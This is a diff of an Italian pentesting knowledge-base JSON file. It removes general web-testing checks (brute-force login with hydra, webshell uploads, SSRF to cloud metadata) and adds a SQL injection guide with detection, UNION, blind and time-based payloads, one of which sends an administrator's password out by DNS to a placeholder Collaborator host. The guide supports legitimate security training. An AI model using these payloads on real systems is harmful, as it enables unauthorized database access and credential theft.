@@ -1,221 +1,177 @@
 {
-  "source": "curato a mano",
   "topics": [
     {
-      "kind": "web",
-      "name": "Ricognizione e fingerprint",
-      "description": "Identificare server, framework, CMS e tecnologie prima di testare.",
-      "intro": "Prima di attaccare conviene capire con cosa si ha a che fare: server web, linguaggio, framework, eventuale CMS, header di sicurezza. Questo orienta tutti i test successivi (es. se e' WordPress, vai alla voce WordPress nelle Tecnologie).",
-      "detection": null,
-      "references": "https://book.hacktricks.xyz/pentesting-web",
-      "checks": [
+      "name": "SQL Injection",
+      "description": "Interferire con le query SQL dell'applicazione tramite input non filtrato.",
+      "references": "https://portswigger.net/web-security/sql-injection",
+      "intro": "L'SQL injection (SQLi) e' una vulnerabilita' che consente a un attaccante di interferire con le query che un'applicazione esegue sul proprio database. Puo' permettere di visualizzare dati che normalmente non sarebbero recuperabili (dati di altri utenti o qualunque dato dell'applicazione), e in alcuni casi di modificarli o cancellarli, alterando il comportamento dell'applicazione.\n\nIndividuazione manuale: su ogni punto di ingresso prova in modo sistematico\n- l'apice singolo ' e cerca errori;\n- sintassi SQL che valuta il valore base del punto di ingresso vs un valore diverso;\n- condizioni booleane come OR 1=1 e OR 1=2, osservando le differenze nelle risposte;\n- payload che causano ritardi temporali quando eseguiti nella query;\n- payload OAST che generano un'interazione di rete fuori banda (verso un server controllato).\n\nPrevenzione: usare query parametrizzate (prepared statement) invece della concatenazione di stringhe, ovunque un input non attendibile appaia come dato nella query (clausola WHERE, valori di INSERT/UPDATE). Dove i parametri non sono utilizzabili (nomi di tabella/colonna, ORDER BY) usare una whitelist di valori ammessi.\n\nCheat sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet",
+      "children": [
         {
-          "title": "Fingerprint tecnologie",
-          "goal": "Riconoscere lo stack dell'applicazione.",
-          "tool": "whatweb / nmap",
-          "command": "whatweb http://<url>    # e:  nmap -p80,443 --script http-headers,http-methods,http-title <ip>",
-          "interpretation": "Rivela tecnologie e versioni (cercale poi nel catalogo). Metodi come PUT/DELETE abilitati sono pericolosi.",
-          "references": null
+          "name": "Rilevare una SQL injection",
+          "description": "I test sistematici da provare su ogni punto di ingresso.",
+          "checks": [
+            {
+              "title": "Apice singolo",
+              "goal": "Primo indizio: rompere la sintassi della query.",
+              "payload": "'",
+              "process": "Inserisci un apice singolo nel punto di ingresso e cerca errori SQL o risposte anomale."
+            },
+            {
+              "title": "Condizioni booleane (OR 1=1 / OR 1=2)",
+              "goal": "Verificare se l'input influenza la logica della query.",
+              "payload": "' OR 1=1--\n' OR 1=2--",
+              "process": "Invia una condizione vera e una falsa e confronta le due risposte: se cambiano, la query e' influenzabile."
+            },
+            {
+              "title": "Ritardi temporali",
+              "goal": "Rilevare SQLi anche senza output visibile.",
+              "payload": "'; IF (1=1) WAITFOR DELAY '0:0:10'--",
+              "process": "Inietta un payload che ritarda la risposta solo se la query viene eseguita; misura il tempo di risposta."
+            },
+            {
+              "title": "Payload OAST (out-of-band)",
+              "goal": "Rilevare SQLi quando non c'e' alcuna differenza osservabile nella risposta.",
+              "payload": "'; exec master..xp_dirtree '//TUO-SOTTODOMINIO.burpcollaborator.net/a'--",
+              "process": "Genera un'interazione di rete (es. DNS) verso un sistema sotto il tuo controllo (Burp Collaborator) e verifica se arriva."
+            }
+          ]
         },
         {
-          "title": "Header di sicurezza",
-          "goal": "Verificare le protezioni lato browser.",
-          "tool": "curl / browser",
-          "command": "curl -sI http://<url>",
-          "interpretation": "Mancanza di CSP, HSTS, X-Frame-Options, cookie senza HttpOnly/Secure: debolezze da annotare.",
-          "references": null
-        }
-      ]
-    },
-    {
-      "kind": "web",
-      "name": "Scoperta dei contenuti",
-      "description": "Trovare pagine, cartelle e file non collegati.",
-      "intro": "Gran parte della superficie d'attacco non e' linkata nelle pagine: pannelli di amministrazione, backup, file di configurazione, repository .git esposti. Si scoprono con il brute force di directory/file e controllando i file noti.",
-      "detection": null,
-      "references": "https://book.hacktricks.xyz/pentesting-web",
-      "checks": [
-        {
-          "title": "Brute force di directory",
-          "goal": "Enumerare percorsi nascosti.",
-          "tool": "feroxbuster / ffuf",
-          "command": "feroxbuster -u http://<url> -w /usr/share/wordlists/dirb/common.txt",
-          "interpretation": "Pagine come /admin, /backup, /.git, /api spesso rivelano funzioni o dati sensibili.",
-          "references": null
+          "name": "Esempi di base",
+          "description": "Gli usi tipici di una SQLi una volta individuata.",
+          "checks": [
+            {
+              "title": "Raggiungere dati nascosti",
+              "goal": "Rimuovere filtri della query per vedere dati non mostrati.",
+              "payload": "https://sito/products?category=Gifts'--",
+              "process": "Il -- commenta il resto della query: SELECT ... WHERE category = 'Gifts'--' AND released = 1 -> salta il filtro 'released = 1'."
+            },
+            {
+              "title": "Aggirare la logica di login",
+              "goal": "Autenticarsi come un utente senza conoscerne la password.",
+              "payload": "administrator'--",
+              "process": "Nel campo username: SELECT * FROM users WHERE username = 'administrator'--' AND password = '' -> il controllo password viene commentato."
+            },
+            {
+              "title": "Dati da altre tabelle (UNION)",
+              "goal": "Aggiungere i risultati di una seconda SELECT a quelli originali.",
+              "payload": "' UNION SELECT username, password FROM users--",
+              "process": "Usa UNION per eseguire una query aggiuntiva su un'altra tabella e accodarne i risultati.",
+              "references": "https://portswigger.net/web-security/sql-injection/union-attacks"
+            }
+          ]
         },
         {
-          "title": "File noti e sensibili",
-          "goal": "Controllare i file che espongono informazioni.",
-          "tool": "browser / curl",
-          "command": "curl http://<url>/robots.txt    # poi: sitemap.xml, .git/, /backup.zip, /.env",
-          "interpretation": "robots.txt e sitemap svelano percorsi; un .git/ o .env esposto e' una fuga grave.",
-          "references": null
-        }
-      ]
-    },
-    {
-      "kind": "web",
-      "name": "Scanner automatici",
-      "description": "Primo passaggio per misconfigurazioni e CVE note.",
-      "intro": "Gli scanner automatici danno una fotografia rapida: componenti con CVE note, file esposti, misconfigurazioni comuni. Sono un punto di partenza, NON la fine: ogni segnalazione va verificata a mano per escludere i falsi positivi.",
-      "detection": null,
-      "references": "https://book.hacktricks.xyz/pentesting-web",
-      "checks": [
-        {
-          "title": "Scansione con nuclei",
-          "goal": "Cercare CVE note e misconfigurazioni con template.",
-          "tool": "nuclei",
-          "command": "nuclei -u http://<url>",
-          "interpretation": "Segnala vulnerabilita' note dei componenti e configurazioni errate. Verifica sempre manualmente.",
-          "references": null
+          "name": "Esaminare il database",
+          "description": "Capire tipo/versione del DBMS ed elencarne tabelle e colonne.",
+          "checks": [
+            {
+              "title": "Tipo e versione del database",
+              "goal": "Identificare il DBMS per adattare i payload.",
+              "payload": "-- Microsoft SQL Server / MySQL:\nSELECT @@version\n-- Oracle:\nSELECT * FROM v$version\n-- PostgreSQL:\nSELECT version()\n-- via UNION:\n' UNION SELECT @@version--",
+              "process": "Inietta la query specifica di ciascun DBMS e vedi quale funziona.",
+              "interpretation": "Su Oracle ogni SELECT richiede FROM: usa la tabella dual (es. UNION SELECT 'abc' FROM dual). In molti DBMS -- richiede uno spazio dopo; si puo' usare anche #."
+            },
+            {
+              "title": "Elencare le tabelle",
+              "goal": "Scoprire quali tabelle esistono.",
+              "payload": "SELECT * FROM information_schema.tables\n-- Oracle:\nSELECT * FROM all_tables",
+              "process": "La maggior parte dei DBMS espone l'information schema con l'elenco delle tabelle."
+            },
+            {
+              "title": "Elencare le colonne di una tabella",
+              "goal": "Scoprire le colonne (es. username, password).",
+              "payload": "SELECT * FROM information_schema.columns WHERE table_name = 'Users'\n-- Oracle:\nSELECT * FROM all_tab_columns WHERE table_name = 'USERS'",
+              "process": "Interroga information_schema.columns filtrando per il nome della tabella trovata."
+            }
+          ]
         },
         {
-          "title": "Scansione con Nikto",
-          "goal": "Controlli classici su file e header.",
-          "tool": "nikto",
-          "command": "nikto -h http://<url>",
-          "interpretation": "File/pannelli di default, metodi pericolosi, header mancanti.",
-          "references": null
-        }
-      ]
-    },
-    {
-      "kind": "web",
-      "name": "Autenticazione e sessione",
-      "description": "Come l'app gestisce login, sessioni e reset password.",
-      "intro": "L'area di autenticazione e' critica: credenziali deboli o di default, gestione insicura della sessione, funzioni di 'password dimenticata' sfruttabili.\nSi verificano il login (forza bruta, default), i cookie di sessione e il flusso di reset.",
-      "detection": null,
-      "references": "https://book.hacktricks.xyz/pentesting-web",
-      "checks": [
-        {
-          "title": "Credenziali deboli / default",
-          "goal": "Provare accessi facili.",
-          "tool": "hydra / manuale",
-          "command": "hydra -l admin -P pass.txt <ip> http-post-form \"/login:user=^USER^&pass=^PASS^:fallita\"",
-          "interpretation": "Credenziali admin/admin o deboli = accesso. Occhio a eventuali blocchi e rate limiting.",
-          "references": null
+          "name": "UNION attacks",
+          "description": "Recuperare dati da altre tabelle quando i risultati finiscono nella risposta.",
+          "references": "https://portswigger.net/web-security/sql-injection/union-attacks",
+          "intro": "UNION accoda i risultati di altre SELECT a quelli della query originale. Perche' funzioni: stesso numero di colonne e tipi di dato compatibili tra le query.",
+          "checks": [
+            {
+              "title": "Numero di colonne con ORDER BY",
+              "goal": "Determinare quante colonne restituisce la query originale.",
+              "payload": "' ORDER BY 1--\n' ORDER BY 2--\n' ORDER BY 3--",
+              "process": "Incrementa l'indice finche' non appare un errore: l'ultimo indice valido e' il numero di colonne."
+            },
+            {
+              "title": "Numero di colonne con UNION SELECT NULL",
+              "goal": "Metodo alternativo per contare le colonne.",
+              "payload": "' UNION SELECT NULL--\n' UNION SELECT NULL,NULL--\n' UNION SELECT NULL,NULL,NULL--\n-- Oracle:\n' UNION SELECT NULL FROM DUAL--",
+              "process": "Aumenta i NULL finche' l'errore sparisce: NULL e' compatibile con ogni tipo."
+            },
+            {
+              "title": "Trovare una colonna di tipo stringa",
+              "goal": "Individuare una colonna che puo' contenere testo (per esfiltrare stringhe).",
+              "payload": "' UNION SELECT 'a',NULL,NULL,NULL--\n' UNION SELECT NULL,'a',NULL,NULL--\n' UNION SELECT NULL,NULL,'a',NULL--",
+              "process": "Metti 'a' in una colonna alla volta: se il tipo non e' compatibile con una stringa, la query da' errore."
+            },
+            {
+              "title": "Recuperare dati interessanti",
+              "goal": "Estrarre i dati veri (es. credenziali).",
+              "payload": "' UNION SELECT username, password FROM users--",
+              "process": "Noto il numero di colonne e quali reggono stringhe, seleziona i campi utili dalla tabella bersaglio."
+            },
+            {
+              "title": "Piu' valori in una sola colonna",
+              "goal": "Esfiltrare piu' campi quando la query restituisce una sola colonna.",
+              "payload": "' UNION SELECT username || '~' || password FROM users--",
+              "process": "Concatena i valori con un separatore (su Oracle l'operatore e' ||)."
+            }
+          ]
         },
         {
-          "title": "Sicurezza della sessione",
-          "goal": "Analizzare i cookie e il ciclo della sessione.",
-          "tool": "browser (DevTools)",
-          "command": "Esamina il cookie di sessione: flag HttpOnly, Secure, SameSite.",
-          "interpretation": "Il token cambia dopo il login? Il logout lo invalida davvero? Flag mancanti = sessione a rischio.",
-          "references": null
-        }
-      ]
-    },
-    {
-      "kind": "web",
-      "name": "Controllo degli accessi (IDOR)",
-      "description": "Verificare che un utente non acceda a dati o azioni non suoi.",
-      "intro": "Molte app controllano chi sei al login ma non su ogni singola azione. Cosi' un utente puo' accedere ai dati di un altro cambiando un identificativo (IDOR) o usare funzioni da amministratore andando direttamente all'URL.\nE' una delle categorie piu' comuni e gravi.",
-      "detection": null,
-      "references": "https://book.hacktricks.xyz/pentesting-web",
-      "checks": [
-        {
-          "title": "IDOR (accesso orizzontale)",
-          "goal": "Accedere ai dati di altri utenti.",
-          "tool": "browser / Burp",
-          "command": "Cambia un id nell'URL o nel parametro: es. /ordine/123 -> /ordine/124",
-          "interpretation": "Se vedi dati di un altro utente senza autorizzazione, e' una IDOR (Insecure Direct Object Reference).",
-          "references": null
+          "name": "Blind SQL injection",
+          "description": "SQLi sfruttabile anche se risposta ed errori non mostrano i risultati.",
+          "references": "https://portswigger.net/web-security/sql-injection/blind",
+          "checks": [
+            {
+              "title": "Risposte condizionali (boolean-based)",
+              "goal": "Dedurre i dati un carattere alla volta dalle differenze di risposta.",
+              "payload": "xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm",
+              "process": "Inietta una condizione vera/falsa (es. su un cookie TrackingId) e osserva un marcatore come \"Welcome back\"; restringi carattere per carattere (SUBSTRING, chiamata SUBSTR in alcuni DBMS)."
+            },
+            {
+              "title": "Errori condizionali (error-based)",
+              "goal": "Usare la presenza/assenza di un errore come oracolo.",
+              "payload": "xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a",
+              "process": "Costruisci una query che va in errore (es. divisione per zero) solo se la condizione e' vera; osserva se compare un messaggio di errore."
+            },
+            {
+              "title": "Estrarre dati dai messaggi di errore",
+              "goal": "Leggere dati direttamente dentro un errore dettagliato.",
+              "payload": "CAST((SELECT example_column FROM example_table) AS int)",
+              "process": "Con CAST converti una stringa in un tipo incompatibile (es. int): l'errore mostra il valore, es. 'invalid input syntax for type integer: \"Example data\"'."
+            },
+            {
+              "title": "Ritardi temporali condizionali (time-based)",
+              "goal": "Usare il tempo di risposta come oracolo quando gli errori sono gestiti.",
+              "payload": "'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:10'--",
+              "process": "La query ritarda solo se la condizione e' vera; misurando il tempo ricostruisci la password carattere per carattere."
+            },
+            {
+              "title": "Out-of-band (OAST) ed esfiltrazione DNS",
+              "goal": "Sfruttare la SQLi quando non c'e' alcun oracolo osservabile nella risposta.",
+              "payload": "'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree \"//'+@p+'.TUO-SOTTODOMINIO.burpcollaborator.net/a\"')--",
+              "process": "Provoca una richiesta DNS verso un sottodominio Collaborator univoco includendo nel nome il dato da esfiltrare; monitora le interazioni ricevute."
+            }
+          ]
         },
         {
-          "title": "Accesso verticale (privilege)",
-          "goal": "Usare funzioni di livello superiore.",
-          "tool": "browser",
-          "command": "Da utente normale, apri direttamente URL/funzioni da amministratore.",
-          "interpretation": "Se la funzione si esegue, manca il controllo dei ruoli (broken access control).",
-          "references": null
-        }
-      ]
-    },
-    {
-      "kind": "web",
-      "name": "Injection (SQLi, XSS, Command)",
-      "description": "I classici: input non validati che finiscono dove non dovrebbero.",
-      "intro": "Quando l'input dell'utente finisce in una query, in una pagina o in un comando senza controlli, nascono le injection: SQL injection, Cross-Site Scripting (XSS), command injection e altre.\nQui trovi l'approccio; per i payload completi vai alla sezione Tecniche.",
-      "detection": null,
-      "references": "https://book.hacktricks.xyz/pentesting-web",
-      "checks": [
-        {
-          "title": "SQL injection",
-          "goal": "Verificare se un parametro e' iniettabile.",
-          "tool": "sqlmap",
-          "command": "sqlmap -u \"http://<url>?id=1\" --batch",
-          "interpretation": "Parametro 'injectable' = SQL injection (CWE-89): accesso/lettura del database.",
-          "references": null
-        },
-        {
-          "title": "Cross-Site Scripting (XSS)",
-          "goal": "Verificare l'esecuzione di codice nel browser.",
-          "tool": "browser",
-          "command": "Inserisci nei campi riflessi/memorizzati:  <script>alert(1)</script>",
-          "interpretation": "Se lo script viene eseguito, c'e' una XSS. Vedi la Tecnica 'Cross Site Scripting' per i payload.",
-          "references": null
-        }
-      ]
-    },
-    {
-      "kind": "web",
-      "name": "Upload di file",
-      "description": "Funzioni di upload mal validate che portano a webshell.",
-      "intro": "Se un'app accetta l'upload di file senza validarli bene (tipo, estensione, contenuto), si puo' caricare una webshell ed eseguire codice sul server.\nSi prova a bypassare i controlli con estensioni doppie, content-type falsi, estensioni alternative.",
-      "detection": null,
-      "references": "https://book.hacktricks.xyz/pentesting-web",
-      "checks": [
-        {
-          "title": "Test di upload",
-          "goal": "Caricare un file eseguibile o bypassare i filtri.",
-          "tool": "browser / Burp",
-          "command": "Carica una webshell (es. shell.php); se bloccato prova shell.php.jpg, shell.phtml, content-type image/jpeg",
-          "interpretation": "Se riesci a far eseguire il file caricato, hai una RCE. Controlla dove finisce il file (path prevedibile).",
-          "references": null
-        }
-      ]
-    },
-    {
-      "kind": "web",
-      "name": "SSRF e richieste lato server",
-      "description": "Far eseguire al server richieste verso risorse interne.",
-      "intro": "Se l'app prende un URL dall'utente e il server lo 'visita' (anteprime, import, webhook), si puo' puntarlo verso risorse interne non raggiungibili dall'esterno: e' la Server-Side Request Forgery (SSRF).",
-      "detection": null,
-      "references": "https://book.hacktricks.xyz/pentesting-web",
-      "checks": [
-        {
-          "title": "Test SSRF",
-          "goal": "Verificare se il server raggiunge risorse interne.",
-          "tool": "browser / Burp",
-          "command": "In un parametro che accetta URL, punta a:  http://169.254.169.254/  o a servizi interni",
-          "interpretation": "Una risposta da un servizio interno (o dai metadata cloud) conferma la SSRF. Vedi la Tecnica dedicata.",
-          "references": null
-        }
-      ]
-    },
-    {
-      "kind": "web",
-      "name": "API",
-      "description": "Le API hanno la loro superficie: endpoint, metodi, autorizzazione.",
-      "intro": "Le applicazioni moderne espongono API (REST/GraphQL). Spesso la sicurezza si concentra sull'interfaccia e le API restano meno protette: endpoint non documentati, metodi pericolosi, controlli di autorizzazione assenti.",
-      "detection": null,
-      "references": "https://book.hacktricks.xyz/pentesting-web",
-      "checks": [
-        {
-          "title": "Enumerazione e metodi",
-          "goal": "Scoprire endpoint e come rispondono.",
-          "tool": "browser / ffuf",
-          "command": "Cerca /api, /swagger, /openapi.json; prova metodi diversi (GET/POST/PUT/DELETE) sugli endpoint",
-          "interpretation": "Endpoint esposti, documentazione aperta o metodi che modificano dati senza autorizzazione = problemi.",
-          "references": null
-        },
-        {
-          "title": "Autorizzazione a livello di oggetto",
-          "goal": "Verificare l'accesso ai dati altrui via API.",
-          "tool": "Burp / curl",
-          "command": "Ripeti una chiamata cambiando l'id dell'oggetto (come una IDOR, ma sull'API)",
-          "interpretation": "Se ottieni dati non tuoi, l'API non verifica la proprieta' dell'oggetto (BOLA/IDOR).",
-          "references": null
+          "name": "SQL injection in contesti diversi",
+          "description": "Input in JSON/XML e offuscamento per aggirare i WAF.",
+          "checks": [
+            {
+              "title": "Offuscare in XML per bypassare i WAF",
+              "goal": "Aggirare filtri che bloccano parole chiave SQL.",
+              "payload": "<stockCheck>\n  <productId>123</productId>\n  <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>\n</stockCheck>",
+              "process": "Codifica i caratteri delle parole proibite (qui la 'S' di SELECT come &#x53;) per superare WAF e filtri basati su parole chiave."
+            }
+          ]
         }
       ]
     }
